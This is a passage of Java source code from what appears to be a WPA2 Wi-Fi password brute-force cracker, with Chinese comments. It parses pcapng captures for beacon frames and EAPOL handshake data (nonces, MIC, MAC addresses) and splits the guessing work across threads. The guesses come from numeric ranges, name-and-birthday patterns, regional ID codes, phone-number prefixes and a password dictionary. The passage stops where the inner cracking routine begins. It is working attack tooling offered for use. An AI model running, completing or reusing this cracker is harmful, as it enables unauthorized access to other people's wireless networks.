					Pcapng_File_Parser(pacapng_file);
				} catch (Exception e) {
					// TODO: handle exception
					e.printStackTrace();

					System.out.println(
							"Pcapng_File_Parser Exception  =  " + e.getMessage() + "  e.toString()" + e.toString());
				}

			}

			System.out.println();
			System.out.println("════════════════════════════════════" + "WPA2密码暴力破解程序运行结束: 结果如下"
					+ "════════════════════════════════════");
			System.out.println("程序 运行 结束  Tip : " + success_crack_tip);

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		// throws IOException
		public Wifi_Frame_AbsCommon_Struct getMatch_Wifi_Frame_Struct(Wifi_Frame_Base_Struct frame_base_struct) {

			byte[] type_and_length = new byte[Block_Type_And_Head_Total_Length];
			try {

				if (pcapng_bis.read(type_and_length) != Block_Type_And_Head_Total_Length) {
					System.out.println("The Pcap file is broken!");
					return null;
				}

			} catch (Exception e) {
				// TODO: handle exception
				System.out.println("pcapng_bis.read(type_and_length)  发生异常 " + e);
			}

			int begin_byte_index = mFile_CurSor_Position;
			int end_byte_index = mFile_CurSor_Position;

			mFile_CurSor_Position += Block_Type_And_Head_Total_Length;

			byte[] block_type = Arrays.copyOfRange(type_and_length, 0, 4);
			String block_type_bytes_hexstr = DigitalTransUtils.byte2hex(block_type, true);

			byte[] block_head_length_bytes = Arrays.copyOfRange(type_and_length, 4, 8);
			String block_head_length_bytes_hexstr = DigitalTransUtils.byte2hex(block_head_length_bytes, true);

			// 将16进制字符串转为10进制的int（注意字符串不要以f开头，如有要先处理为0）
			int block_head_length = Integer.parseInt(clearZero_for_NumberStr(block_head_length_bytes_hexstr), 16);
//		    if(!DigitalTransUtils.byte2hex(block_type).equalsIgnoreCase("A1B2C3D4")){
//		        bo = ByteOrder.LITTLE_ENDIAN;
//		    }
//		    reader = new ByteReader(bo);
//		    offset = 24;

			// 解析 Global Header
//		    GlobalHeader globalHeader = parseGlobalHeader(globalHeaderBuffer);

			// 【block_type_bytes_hexstr = 0A0D0D0A】
			// block_head_length_bytes_hexstr=【6C000000】 ByteOrder.BIG_ENDIAN 大端对齐了 实际 要小端对齐
			// 【block_type_bytes_hexstr = 0A0D0D0A】
			// block_head_length_bytes_hexstr=【0000006C】 block_head_length【108】
//		    System.out.println("【block_type_bytes_hexstr = "+block_type_bytes_hexstr+"】   block_head_length_bytes_hexstr=【"+block_head_length_bytes_hexstr+"】 block_head_length【"+block_head_length+"】");

			// 去除了 headLength=4 和 BlockTYpe=4 总 8个 字节的 剩余的字节数组
			int rest_frame_length = block_head_length - Block_Type_And_Head_Total_Length;
			byte[] all_frame_byte_withoutBlockType_withoutHeadTotalLength = new byte[rest_frame_length];

			byte[] all_frame_bytes = null;
			String all_frame_hexstr = null;
			int readRestByteCount = 0;

			try {
				readRestByteCount = pcapng_bis.read(all_frame_byte_withoutBlockType_withoutHeadTotalLength, 0,
						rest_frame_length);
			} catch (Exception e) {
				System.out.println(
						" pcapng_bis.read(all_frame_byte_withoutBlockType_withoutHeadTotalLength, 0, rest_frame_length) 异常 e="
								+ e);
			}

			mFile_CurSor_Position += rest_frame_length;

			String all_rest_frame_byte_hexstr = DigitalTransUtils
					.byte2hex(all_frame_byte_withoutBlockType_withoutHeadTotalLength, false);
			if (all_rest_frame_byte_hexstr == null) {
				System.out.println(
						"all_rest_frame_byte_hexstr  读取为空 ! block_type_bytes_hexstr=" + block_type_bytes_hexstr);
				return null;
			} else {
//			   System.out.println("all_rest_frame_byte_hexstr.length = "+ all_frame_byte_withoutBlockType_withoutHeadTotalLength.length +"   readByteCount="+readRestByteCount);

//			   System.out.println("all_rest_frame_byte_hexstr=\n"+all_rest_frame_byte_hexstr);

				all_frame_bytes = byteMerger(block_type, block_head_length_bytes,
						all_frame_byte_withoutBlockType_withoutHeadTotalLength);

				all_frame_hexstr = DigitalTransUtils.byte2hex(all_frame_bytes, false);

//			   System.out.println("all_frame_hexstr=\n"+all_frame_hexstr);

			}

			if (all_frame_bytes.length < 4) {

				System.out.println(" 当前读取 WIFI 帧 失败! 请检查!");
				return null;
			}
			byte[] block_tail_length_bytes = { all_frame_bytes[all_frame_bytes.length - 4],
					all_frame_bytes[all_frame_bytes.length - 3], all_frame_bytes[all_frame_bytes.length - 2],
					all_frame_bytes[all_frame_bytes.length - 1] };

			String block_tail_length_bytes_hexstr = DigitalTransUtils.byte2hex(block_tail_length_bytes, true);
			int block_tail_length = Integer.parseInt(clearZero_for_NumberStr(block_tail_length_bytes_hexstr), 16);

			if (block_tail_length != block_head_length) {
				System.out.println("block_tail_length_bytes_hexstr = " + block_tail_length_bytes_hexstr);
				System.out.println(" 当前读取 到的帧  block_head_length=" + block_head_length + "    block_tail_length="
						+ block_tail_length + "  请检查!");
				return null;
			}

			end_byte_index = mFile_CurSor_Position;

			Wifi_Frame_AbsCommon_Struct matchFrame = frame_base_struct.getMatch_Wifi_Frame(block_type_bytes_hexstr);
			matchFrame.frame_bytes = all_frame_bytes;
			matchFrame.frame_bytes_hexstr = all_frame_hexstr;

			matchFrame.frame_length = all_frame_bytes.length;
			matchFrame.block_type_4bytes = block_type;
			matchFrame.block_type_str = block_type_bytes_hexstr;

			matchFrame.head_block_total_length_4bytes = block_head_length_bytes;
			matchFrame.head_block_total_length = block_head_length;
			matchFrame.head_block_total_length_4bytes_hexstr = block_head_length_bytes_hexstr;

			matchFrame.tail_block_total_length_4bytes = block_tail_length_bytes;
			matchFrame.tail_block_total_length = block_tail_length;
			matchFrame.tail_block_total_length_4bytes_hexstr = block_tail_length_bytes_hexstr;

			matchFrame.frame_begin_index = begin_byte_index;
			matchFrame.frame_end_index = end_byte_index;

			matchFrame.package_number = wifiFrameStructList.size() - 1; // 为了与 wireshark 对齐 这里 -1

			return matchFrame;
		}

		public void Pcapng_File_Parser(File pcapFile) throws Exception {
			long fileSize = pcapFile.length();
//    System.out.println("文件长度:"+fileSize);
			pcapng_bis = new BufferedInputStream(new FileInputStream(pcapFile));
			Wifi_Frame_Base_Struct frame_base_struct = new Wifi_Frame_Base_Struct();

			while (mFile_CurSor_Position < fileSize) {

				Wifi_Frame_AbsCommon_Struct matchWiFiFrame = getMatch_Wifi_Frame_Struct(frame_base_struct);

				if (matchWiFiFrame != null) {
					wifiFrameStructList.add(matchWiFiFrame);
				} else {

					System.out.println(
							"遇到 解析 到的 matchWiFiFrame == null 的 情况 请检查  mFile_CurSor_Position=" + mFile_CurSor_Position);
				}

			}

			pcapng_bis.close();

			for (int i = 0; i < wifiFrameStructList.size(); i++) {

				Wifi_Frame_AbsCommon_Struct wif_frame_struct = wifiFrameStructList.get(i);
				System.out.println();
				System.out.println("═════════════[" + i + "]" + "[" + wifiFrameStructList.size() + "]" + "____["
						+ wif_frame_struct.block_type_str + "]" + "═══════════");
				wif_frame_struct.parse_wifi_frame(wif_frame_struct.frame_bytes);
				System.out.println();
//    	System.out.println(wif_frame_struct);

				if (wif_frame_struct.getEAPOL_Handshake_Message_Number() > 0) {
					wifiEapolFrameStructList.add(wif_frame_struct);
				}
//
				if (wif_frame_struct.is_beacon_frame()) {
					String ssid_identify = wif_frame_struct.getBeacon_Identify();
					if (!wifiBeaconIdetifyList.contains(ssid_identify) && wif_frame_struct.get_wifi_ssid() != null) {

						wifiBeaconIdetifyList.add(ssid_identify);
						wifiBeaconFrameStructList.add(wif_frame_struct);
					}

				}

				System.out.println();
			}

			for (int j = 0; j < wifiBeaconFrameStructList.size(); j++) {
				Wifi_Frame_AbsCommon_Struct wif_beacon_frame_struct = wifiBeaconFrameStructList.get(j);
				System.out.println("══════No." + wif_beacon_frame_struct.package_number + "═══════Beacon[" + (j + 1)
						+ "]" + "[" + wifiBeaconFrameStructList.size() + "]" + " "
						+ wif_beacon_frame_struct.getBeacon_Identify() + "  "
						+ wif_beacon_frame_struct.getFrame_TimeStamp_Desc() + "══════════");

			}

			if (tel_number_pre_5num_list == null || tel_number_pre_5num_list.size() == 0) {
				System.out.println("初始化 前5 位 电话号码数据 开始");
				init_tel_number(); // 初始化 电话 号码
				System.out.println("初始化 前5 位 电话号码数据 结束");
			}


			Wifi_Frame_AbsCommon_Struct temp_eap_frame_message1 = null;
			Wifi_Frame_AbsCommon_Struct temp_eap_frame_message2 = null;

			for (int i = 0; i < wifiEapolFrameStructList.size(); i++) {
				Wifi_Frame_AbsCommon_Struct wif_eapol_frame_struct = wifiEapolFrameStructList.get(i);
				System.out.println("══════No." + wif_eapol_frame_struct.package_number + "═══════EAPOL[" + (i + 1) + "]"
						+ "[" + wifiEapolFrameStructList.size() + "]" + " "
						+ wif_eapol_frame_struct.getEAPOL_Handshake_Message_Number() + " message "
						+ wif_eapol_frame_struct.getFrame_TimeStamp_Desc() + "══════════");
				System.out.println(
						"WPA Key Nonce:" + Arrays.toString(wif_eapol_frame_struct.getEAPOL_WPA_Key_Nonce_Bytes()));
				System.out.println("WPA Key MIC:" + Arrays.toString(wif_eapol_frame_struct.getEAPOL_WPA_MIC_Bytes()));
				if (wif_eapol_frame_struct.getEAPOL_Handshake_Message_Number() == 2) { // 获取 step2_data

					if (wif_eapol_frame_struct.getEAPOL_8021X_Authentication_Bytes() == null) {
						System.out.println(
								"Step_2 EAPOL 802.1X Authentication Data Length: 0 ,  没有获取到所有的 802.1X Auth数据 ");

						continue;
					}
					System.out.println("Step_2 EAPOL 802.1X Authentication Data Length:"
							+ wif_eapol_frame_struct.getEAPOL_8021X_Authentication_Bytes().length);
					System.out.println("Step_2 EAPOL 802.1X Authentication Data :"
							+ Arrays.toString(wif_eapol_frame_struct.getEAPOL_8021X_Authentication_Bytes()));

					System.out.println("Step_2 EAPOL Receiver_Address( AP_MAC )"
							+ Arrays.toString(wif_eapol_frame_struct.getFrame_Receiver_Address()));
					System.out.println("Step_2 EAPOL Transmitter_Address( STA_MAC )"
							+ Arrays.toString(wif_eapol_frame_struct.getFrame_Transmitter_Address()));

					temp_eap_frame_message2 = wif_eapol_frame_struct;
				}

				if (wif_eapol_frame_struct.getEAPOL_Handshake_Message_Number() == 1) {

					System.out.println("Step_1 WPA Key Nonce( AP_Nonce ):"
							+ Arrays.toString(wif_eapol_frame_struct.getEAPOL_WPA_Key_Nonce_Bytes()));

					temp_eap_frame_message1 = wif_eapol_frame_struct;
				}



				if(input_ssid_str_bytearr != null && input_bssid_str_bytearr != null &&
						temp_eap_frame_message2 !=  null && temp_eap_frame_message1 != null ) {



					if (Arrays.equals(input_bssid_str_bytearr, temp_eap_frame_message1.get_wifi_bssid_Bytes()) &&
							Arrays.equals(input_bssid_str_bytearr, temp_eap_frame_message2.get_wifi_bssid_Bytes())){

						add_used_wpa2_password(wp2_password_dictionary_list);
						Wifi_Crack_Info_Struct matchCrackInfo = new Wifi_Crack_Info_Struct(input_ssid_str_bytearr,
								temp_eap_frame_message1, temp_eap_frame_message2, area_policy_code_list, wp2_password_dictionary_list,
								tel_number_pre_5num_list);

						if(!wifiCrack_BSSID_InfoList.contains(input_bssid_str)) {
							wifiCrack_BSSID_InfoList.add(input_bssid_str);
							wifiCrackInfoList.add(matchCrackInfo);
						}



					}


				}



			}



			System.out.println("input_ssid_str_bytearr = "+Arrays.toString(input_ssid_str_bytearr));
			System.out.println("input_bssid_str_bytearr = "+Arrays.toString(input_bssid_str_bytearr));

			System.out.println("temp_eap_frame_message1 = "+Arrays.toString(temp_eap_frame_message1.get_wifi_bssid_Bytes()));
			System.out.println("temp_eap_frame_message2 = "+Arrays.toString(temp_eap_frame_message2.get_wifi_bssid_Bytes()));





			System.out.println(" WIFI Beacon 帧数量:"+ wifiBeaconFrameStructList.size());
			for (int i = 0; i < wifiBeaconFrameStructList.size(); i++) {
				Wifi_Frame_AbsCommon_Struct wif_beacon_frame_struct = wifiBeaconFrameStructList.get(i);
				byte[] beacon_bssid_bytes = wif_beacon_frame_struct.get_wifi_bssid_Bytes();
				if (beacon_bssid_bytes == null) {
					continue;
				}
				Wifi_Frame_AbsCommon_Struct eap_frame_message1 = null;
				Wifi_Frame_AbsCommon_Struct eap_frame_message2 = null;

				for (int j = 0; j < wifiEapolFrameStructList.size(); j++) {
					Wifi_Frame_AbsCommon_Struct eapol_frame_struct = wifiEapolFrameStructList.get(j);

					if (eapol_frame_struct.getEAPOL_Handshake_Message_Number() == 1) { // eap 第一帧
						byte[] eap_message1_bssid_bytes = eapol_frame_struct.get_wifi_bssid_Bytes();
						if (Arrays.equals(beacon_bssid_bytes, eap_message1_bssid_bytes)) {
							eap_frame_message1 = eapol_frame_struct;

						}

					} else if (eapol_frame_struct.getEAPOL_Handshake_Message_Number() == 2) { // eap 第二帧

						byte[] eap_message2_bssid_bytes = eapol_frame_struct.get_wifi_bssid_Bytes();
						if (Arrays.equals(beacon_bssid_bytes, eap_message2_bssid_bytes)) {
							eap_frame_message2 = eapol_frame_struct;

						}

					}



				}

				if (wif_beacon_frame_struct != null && eap_frame_message1 != null && eap_frame_message2 != null) {



					add_used_wpa2_password(wp2_password_dictionary_list);
					Wifi_Crack_Info_Struct matchCrackInfo = new Wifi_Crack_Info_Struct(wif_beacon_frame_struct,
							eap_frame_message1, eap_frame_message2, area_policy_code_list, wp2_password_dictionary_list,
							tel_number_pre_5num_list);


					if(!wifiCrack_BSSID_InfoList.contains(wif_beacon_frame_struct.get_wifi_ssid())) {
						wifiCrack_BSSID_InfoList.add(wif_beacon_frame_struct.get_wifi_ssid());
						wifiCrackInfoList.add(matchCrackInfo);
					}


				}

			}





			System.out.println("总共解析的帧数量如下: wifiFrameStructList.size() = " + wifiFrameStructList.size()
					+ "  mFile_CurSor_Position=" + mFile_CurSor_Position);
			System.out.println("Beacon帧数量如下: wifiBeaconFrameStructList.size() = " + wifiBeaconFrameStructList.size());
			System.out.println("EAPOL帧数量如下: wifiEapolFrameStructList.size() = " + wifiEapolFrameStructList.size());
			System.out.println("匹配到的能破解wifi密码的 CrackInfo信息数量: wifiCrackInfoList.size() = " + wifiCrackInfoList.size());
			if (wifiCrackInfoList.size() == 0) {
				System.out.println("很遗憾  在当前 pcapng 文件中 没有搜索到 能破解 wifi密码 对应的 eap beacon 帧 信息!");
				return;
			}
			System.out.println("恭喜 当前搜索到的 可以暴力穷举破解的wifi 列表信息如下:");
			for (int i = 0; i < wifiCrackInfoList.size(); i++) {
				Wifi_Crack_Info_Struct crackWifiInfo = wifiCrackInfoList.get(i);
				if(crackWifiInfo.beacon_frame != null) {
					System.out.println("wifi_" + (i + 1) + "【" + crackWifiInfo.beacon_frame.get_wifi_ssid() + "】");
				}else {
					String ssid_name_temp = "";

					try {
						ssid_name_temp = new String(crackWifiInfo.target_ssid_byte_arr,"UTF-8");
					}catch (UnsupportedEncodingException e) {

						// TODO Auto-generated catch block

						e.printStackTrace();

					}

					System.out.println("wifi_" + (i + 1) + "【" + ssid_name_temp +"】__【target_ssid_byte_arr("+ByteAsHexString(crackWifiInfo.target_ssid_byte_arr)+")"+ "(手动输入 SSID["+input_ssid_str+"]["+ByteAsHexString(input_ssid_str_bytearr)+"]  BSSID["+input_bssid_str+"]["+ByteAsHexString(input_bssid_str_bytearr)+"]) 】");


				}


			}

			System.out.println("提示信息:\n");

			System.out.println(success_crack_tip);
			for (int i = 0; i < wifiCrackInfoList.size(); i++) {
				Wifi_Crack_Info_Struct crackWifiInfo = wifiCrackInfoList.get(i);


				System.out.println("开始破解 当前搜索到的 可以暴力穷举破解wifi " + "wifi_" + (i + 1) + "【"
						+ new String(crackWifiInfo.target_ssid_byte_arr) + "】");



//    	crackWifiInfo.begin_wifi_crack();   // 10个线程 去搞 ?
				int all_thread_count = Rule_53_Thread_Count; // 当前用于运算的线程数量

				mCountDownLatch = new CountDownLatch(all_thread_count);
				for (int j = 0; j < all_thread_count; j++) { // 用 10 个 线程 去执行
					Wifi_Crack_Info_Struct crackWifiInfo_cloneItem = crackWifiInfo.deep_clone(crackWifiInfo);

					crackWifiInfo_cloneItem.init_with_thread_num((j), all_thread_count);

					new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							crackWifiInfo_cloneItem.begin_wifi_crack();
							CountDownLatch_Inc(); // 通知 执行 结束
						}
					}).start();

				}
			}

			mCountDownLatch.await();// 主线程等待子线程执行输出 执行完成
			// 开始 匹配 EAP第一帧 , EAP 第二帧 , Beacon帧 组成一个解析结构体

		}

		void CountDownLatch_Inc() {// 注意，如果不加上synchronized，由于并发写入，结果会小于1000

			mCountDownLatch.countDown();
		}

		// 添加 常用 密码
		void add_used_wpa2_password(ArrayList<String> pwd_list) {

//	pwd_list.add("LINUXZSJ");
//	pwd_list.add("cesarwisl");

		}

	}




	public volatile static boolean success_crack_flag = false; // 成功破解 密码 标识符号
	public volatile static String success_crack_tip = zbinPath+File.separator+"I9_wpa2_crack_rule53_pwd_dictionary.txt    该文件包含用户自定义明文密码"; // 成功破解 密码 标识符号 提示

	static long password_retry_calcul_count = 0; // 当前 已经 进行过 计算的 数据的个数
	static double password_retry_calcul_percent = 0; // 当前 总的位数的 进度

	class Wifi_Crack_Info_Struct {
		Wifi_Frame_AbsCommon_Struct eap_frame_1; // 第一个 交互帧 含有 bssid(热点的mac地址)
		Wifi_Frame_AbsCommon_Struct eap_frame_2; // 第一个 交互帧 含有 bssid(热点的mac地址)
		Wifi_Frame_AbsCommon_Struct beacon_frame; // 热点beacon 帧 含有 bssid(热点的mac地址) 和 ssid
		byte[] target_ssid_byte_arr ; //  外部输入的 ssid 的名称  字节数组

		int thread_id;
		int thread_count;

		ArrayList<String> area_policy_code_alllist; // 默认的 所有的 区域列表
		ArrayList<String> area_policy_code_sublist; // 身份证 前6位 列表 I9_wp2_crack_rule53_areacode.txt 依据线程id thread_count
		// 来分
		ArrayList<String> wp2_password_dictionary_alllist;
		ArrayList<String> wp2_password_dictionary_sublist; // wpa2的 密码字典 I9_wpa2_crack_rule53_pwd_dictionary.txt 依照线程分

		ArrayList<String> tel_code_pre5_alllist;  // 前5位的 所有情况
		ArrayList<String> tel_code_pre5_sublist;  // 由于是多线程  当前是分配到本线程需要计算的列表

		void init_with_thread_num(int threadId, int threadCount) { // 1 10
			thread_id = threadId;
			thread_count = threadCount;

			long average_number_count_8 = (long) ((pwd_8_end_long + 1) / threadCount);
			pwd_8_begin_long = threadId * average_number_count_8;
			pwd_8_end_long = threadId * average_number_count_8 + average_number_count_8 - 1;

			long average_number_count_9 = (long) ((pwd_9_end_long + 1) / threadCount);
			pwd_9_begin_long = threadId * average_number_count_9;
			pwd_9_end_long = threadId * average_number_count_9 + average_number_count_9 - 1;

			int current_Year = Integer.parseInt(getTimeStamp_YYYY());

			int distance_year = (int) Math
					.ceil((double) ((current_Year - YEAR_BEGIN_SEARCH_DEFAULT) / (double) threadCount));

			year_search_begin = threadId * distance_year + YEAR_BEGIN_SEARCH_DEFAULT;
			year_search_end = year_search_begin + distance_year;

			if (year_search_begin > current_Year) {

				System.out
						.println("thread[" + threadId + "][" + threadCount + "]  year_search_begin=" + year_search_begin
								+ "  year_search_end=" + year_search_end + "  放弃执行 name+birthday的操作! 生日在未来的情况!");
				year_search_end = year_search_begin - 1; // 不需要执行了
			}

			area_policy_code_sublist = new ArrayList<String>();
			int all_area_code_length = area_policy_code_alllist.size();

			int average_are_code_length = (int) ((all_area_code_length) / threadCount) + 1;
			int area_begin_index = threadId * average_are_code_length;
			int area_end_index = area_begin_index + average_are_code_length - 1;
			if (area_end_index >= all_area_code_length) {

				area_end_index = all_area_code_length - 1;
			}
			if (area_begin_index < all_area_code_length && area_end_index < all_area_code_length) {
				for (int i = area_begin_index; i <= area_end_index; i++) {
					area_policy_code_sublist.add(area_policy_code_alllist.get(i));
				}

			}

			wp2_password_dictionary_sublist = new ArrayList<String>();
			int all_wpa_pwd_length = wp2_password_dictionary_alllist.size();

			int average_wpa_pwd_length = (int) ((all_wpa_pwd_length) / threadCount) + 1;
			int wpa_pwd_begin_index = threadId * average_wpa_pwd_length;
			int wpa_pwd_end_index = wpa_pwd_begin_index + average_wpa_pwd_length - 1;
			if (wpa_pwd_end_index >= all_wpa_pwd_length) {

				wpa_pwd_end_index = all_wpa_pwd_length - 1;
			}
			if (wpa_pwd_begin_index < all_wpa_pwd_length && wpa_pwd_end_index < all_wpa_pwd_length) {
				for (int i = wpa_pwd_begin_index; i <= wpa_pwd_end_index; i++) {
					wp2_password_dictionary_sublist.add(wp2_password_dictionary_alllist.get(i));
				}

			}

//		thread[0][1]  pwd_8_begin_long=0  pwd_8_end_long=99999999  pwd_9_begin_long=0 pwd_9_end_long=999999999
//				year_search_begin=1876  year_search_end=1949  current_Year=2022 distance_year=73  YEAR_BEGIN_SEARCH_DEFAULT=1949
//				area_begin_index=0  area_end_index=1  area_all_length=3520  area_policy_code_sublist.size()=0 wpa_pwd_begin_index=0
//				wpa_pwd_end_index=2 all_wpa_pwd_length=2  wp2_password_dictionary_sublist.size()=0

			tel_code_pre5_sublist = new ArrayList<String>();
			int all_tel_code_length = tel_code_pre5_alllist.size();

			int average_tel_code_length = (int) ((all_tel_code_length) / threadCount) + 1;
			int tel_code_begin_index = threadId * average_tel_code_length;
			int tel_code_end_index = tel_code_begin_index + average_tel_code_length - 1;
			if (tel_code_end_index >= all_tel_code_length) {

				tel_code_end_index = all_tel_code_length - 1;
			}
			if (tel_code_begin_index < all_tel_code_length && tel_code_end_index < all_tel_code_length) {
				for (int i = tel_code_begin_index; i <= tel_code_end_index; i++) {
					tel_code_pre5_sublist.add(tel_code_pre5_alllist.get(i));
				}

			}

			System.out.println("thread[" + threadId + "][" + threadCount + "]  pwd_8_begin_long=" + pwd_8_begin_long
					+ "  pwd_8_end_long=" + pwd_8_end_long + "  pwd_9_begin_long=" + pwd_9_begin_long
					+ " pwd_9_end_long=" + pwd_9_end_long + "  average_are_code_length=" + average_are_code_length
					+ "  average_wpa_pwd_length=" + average_wpa_pwd_length + "  year_search_begin=" + year_search_begin
					+ "  year_search_end=" + year_search_end + "  current_Year=" + current_Year + " distance_year="
					+ distance_year + "  YEAR_BEGIN_SEARCH_DEFAULT=" + YEAR_BEGIN_SEARCH_DEFAULT + "  area_begin_index="
					+ area_begin_index + "  area_end_index=" + area_end_index + "  area_all_length="
					+ all_area_code_length + "  area_policy_code_sublist.size()=" + area_policy_code_sublist.size()
					+ " wpa_pwd_begin_index=" + wpa_pwd_begin_index + " wpa_pwd_end_index=" + wpa_pwd_end_index
					+ " all_wpa_pwd_length=" + all_wpa_pwd_length + "  wp2_password_dictionary_sublist.size()="
					+ wp2_password_dictionary_sublist.size()

					+ " tel_code_begin_index=" + tel_code_begin_index + " tel_code_end_index=" + tel_code_end_index
					+ " all_tel_code_length=" + all_tel_code_length + "  tel_code_sublist.size()="
					+ tel_code_pre5_sublist.size()

					+ "");

//       area_policy_code_sublist = Arrays.copyOf(area_policy_code_alllist, area_begin_index, area_end_index);

		}

		Wifi_Crack_Info_Struct deep_clone(Wifi_Crack_Info_Struct crackInfo) {
			Wifi_Crack_Info_Struct crack_clone =  null ;
			if(crackInfo.beacon_frame == null) {

				crack_clone = new Wifi_Crack_Info_Struct(crackInfo.target_ssid_byte_arr,
						crackInfo.eap_frame_1, crackInfo.eap_frame_2, crackInfo.area_policy_code_alllist,
						crackInfo.wp2_password_dictionary_alllist, crackInfo.tel_code_pre5_alllist);
			} else {

				crack_clone = new Wifi_Crack_Info_Struct(crackInfo.beacon_frame,
						crackInfo.eap_frame_1, crackInfo.eap_frame_2, crackInfo.area_policy_code_alllist,
						crackInfo.wp2_password_dictionary_alllist, crackInfo.tel_code_pre5_alllist);
			}

			return crack_clone;

		}

		long pwd_8_begin_long; // 默认为 0
		long pwd_8_end_long; // 默认为 99999999 一亿个数字

		long pwd_9_begin_long; // 默认为 0
		long pwd_9_end_long; // 默认为 999999999 十亿个数字

		long pwd_10_begin_long; // 默认为 0
		long pwd_10_end_long; // 默认为 9999999999 百亿个数字

		long pwd_11_begin_long; // 默认为 0
		long pwd_11_end_long; // 默认为 99999999999 千亿个数字

		long MAX_8_COUNT = 100000000L;
		long MAX_9_COUNT = 1000000000L;
		long MAX_10_COUNT = 10000000000L;
		long MAX_11_COUNT = 100000000000L;
		long MAX_CUR_COUNT = MAX_8_COUNT;

		String little_char_arr_A[] = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
				"q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
		String little_char_arr_B[] = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
				"q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
		String little_char_arr_C[] = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
				"q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };
		// 19500101--19501231 每个月 给它整个31天
		int DayCount_Of_Month = 31;
		int MonthCount_Of_Year = 12;

		int YEAR_BEGIN_SEARCH_DEFAULT = 1949;
		int year_search_begin = 1949;
		int year_search_end = 2022;
		//

		// 9个字母的循环 百亿次 nima
		String char_arr_default[] = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
				"q", "r", "s", "t", "u", "v", "w", "x", "y", "z" };

		ArrayList<String> all_char_list;

		void init_all_char_list() {
			all_char_list = new ArrayList<String>();

			for (int i = 0; i < char_arr_default.length; i++) {
				all_char_list.add(char_arr_default[i]);
				all_char_list.add(char_arr_default[i].toUpperCase());
			}

			all_char_list.add(".");
			all_char_list.add("%");
			all_char_list.add(")");
			all_char_list.add("(");
			all_char_list.add("!");
			all_char_list.add("$");
			all_char_list.add("@");
			all_char_list.add("[");
			all_char_list.add("]");
			all_char_list.add("-");
			all_char_list.add("&");
			all_char_list.add("*");
			all_char_list.add("^");
			all_char_list.add("#");
			all_char_list.add("`");
			all_char_list.add("~");
			all_char_list.add("<");
			all_char_list.add(">");
			all_char_list.add("?");
			all_char_list.add(":");
			all_char_list.add("|");
			all_char_list.add("\\");
			all_char_list.add("+");
			all_char_list.add("=");
			all_char_list.add(",");
			all_char_list.add(";");
			all_char_list.add("'");
			all_char_list.add("\"");

		}


		Wifi_Crack_Info_Struct(byte[] ssid_byte, Wifi_Frame_AbsCommon_Struct eap1,
							   Wifi_Frame_AbsCommon_Struct eap2,

							   ArrayList<String> area_code_list, ArrayList<String> wpa2_pwd_list, ArrayList<String> tel_list) {
			target_ssid_byte_arr = ssid_byte;

			eap_frame_1 = eap1;
			eap_frame_2 = eap2;
			wp2_password_dictionary_alllist = wpa2_pwd_list;
			area_policy_code_alllist = area_code_list;
			tel_code_pre5_alllist = tel_list;
			pwd_8_begin_long = 0;
			pwd_8_end_long = 99999999L;

			pwd_9_begin_long = 0;
			pwd_9_end_long = 999999999L;

			pwd_10_begin_long = 0;
			pwd_10_end_long = 9999999999L;

			pwd_11_begin_long = 0;
			pwd_11_end_long = 99999999999L;

			YEAR_BEGIN_SEARCH_DEFAULT = 1949;
			year_search_end = Integer.parseInt(getTimeStamp_YYYY());
			year_search_begin = YEAR_BEGIN_SEARCH_DEFAULT;

			init_all_char_list();

		}


		Wifi_Crack_Info_Struct(Wifi_Frame_AbsCommon_Struct beacon, Wifi_Frame_AbsCommon_Struct eap1,
							   Wifi_Frame_AbsCommon_Struct eap2,

							   ArrayList<String> area_code_list, ArrayList<String> wpa2_pwd_list, ArrayList<String> tel_list) {
			beacon_frame = beacon;
			target_ssid_byte_arr = beacon_frame.get_wifi_ssid_Bytes();
			eap_frame_1 = eap1;
			eap_frame_2 = eap2;
			wp2_password_dictionary_alllist = wpa2_pwd_list;
			area_policy_code_alllist = area_code_list;
			tel_code_pre5_alllist = tel_list;
			pwd_8_begin_long = 0;
			pwd_8_end_long = 99999999L;

			pwd_9_begin_long = 0;
			pwd_9_end_long = 999999999L;

			pwd_10_begin_long = 0;
			pwd_10_end_long = 9999999999L;

			pwd_11_begin_long = 0;
			pwd_11_end_long = 99999999999L;

			YEAR_BEGIN_SEARCH_DEFAULT = 1949;
			year_search_end = Integer.parseInt(getTimeStamp_YYYY());
			year_search_begin = YEAR_BEGIN_SEARCH_DEFAULT;

			init_all_char_list();

		}

		void begin_wifi_crack() {

//			byte[] ssid_bytes_1 = beacon_frame.get_wifi_ssid_Bytes();
			byte[] ssid_bytes_1 = target_ssid_byte_arr;
			byte[] ap_mac_bytes_2 = eap_frame_2.getFrame_Receiver_Address();
			byte[] sta_mac_bytes_3 = eap_frame_2.getFrame_Transmitter_Address();

			byte[] ap_nonce_bytes_4 = eap_frame_1.getEAPOL_WPA_Key_Nonce_Bytes();
			byte[] sta_nonce_bytes_5 = eap_frame_2.getEAPOL_WPA_Key_Nonce_Bytes();
			byte[] step2_data_bytes_6 = eap_frame_2.getEAPOL_8021X_Authentication_Bytes();
			byte[] mic_bytes_7 = eap_frame_2.getEAPOL_WPA_MIC_Bytes();

			begin_wifi_crack_inner(wp2_password_dictionary_sublist, ssid_bytes_1, ap_mac_bytes_2, sta_mac_bytes_3,
					ap_nonce_bytes_4, sta_nonce_bytes_5, step2_data_bytes_6, mic_bytes_7);

		}

		// 速度 不如 C 啊
		// 300姓氏*生日的组合(365*70)*2 300*365*70*2 ═════════ 15330000 肯定小写 还来大写 wannima
		// 名字大全
		// 全国行政 区块的 编号 比如 姓氏+362323
		// 常用密码字典 这个可以写在 password_dic.txt 文件中
		// 25*25*【6位数字 百万】
		// 25*25*25【5位数字 十万】

		// 25*25*25*行政编码=

		// 号码-前三位运行商--后四位地区-最后四位排序

		private void begin_wifi_crack_inner(ArrayList<String> pwdList, byte[] ssid_bytes, byte[] ap_mac_bytes,
											byte[] sta_mac_bytes, byte[] ap_nonce_bytes, byte[] sta_nonce_bytes, byte[] step2_data_bytes,
											byte[] mic_bytes) {

